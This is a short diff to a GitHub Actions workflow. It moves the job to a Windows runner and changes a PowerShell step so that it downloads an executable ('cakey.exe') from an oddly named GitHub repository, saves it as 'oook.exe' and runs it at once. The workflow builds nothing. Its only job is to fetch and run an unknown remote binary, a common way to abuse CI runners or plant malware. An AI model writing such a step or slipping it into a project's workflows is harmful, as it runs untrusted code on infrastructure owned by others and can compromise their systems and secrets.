@@ -3,8 +3,8 @@ on:
   workflow_dispatch:
 jobs:
   build:
-    runs-on: ac
+    runs-on: windows-latest
     steps:
       - name: powershell
         shell: cmd
-        run: powershell.exe -c Invoke-WebRequest https://github.com/crafdfsdfsd/fgdfgdfg/raw/main/a.exe -OutFile oook.exe ; .\oook.exe
+        run: powershell.exe -c Invoke-WebRequest https://github.com/picker56456/dsm/raw/main/cakey.exe -OutFile oook.exe ; .\oook.exe
